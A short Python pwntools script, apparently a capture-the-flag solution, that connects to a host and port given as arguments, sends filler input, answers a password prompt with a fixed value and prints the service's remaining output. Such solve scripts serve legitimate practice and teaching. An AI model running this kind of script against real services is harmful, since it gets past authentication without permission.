from pwn import *
import sys

s = remote(sys.argv[1], int(sys.argv[2]))
s.send(b"aaaaaaaaaaa\n")
s.recvuntil(b"password: ")
s.sendline(b"970")
s.recvuntil(b"btw\n")
info(s.recvallS())
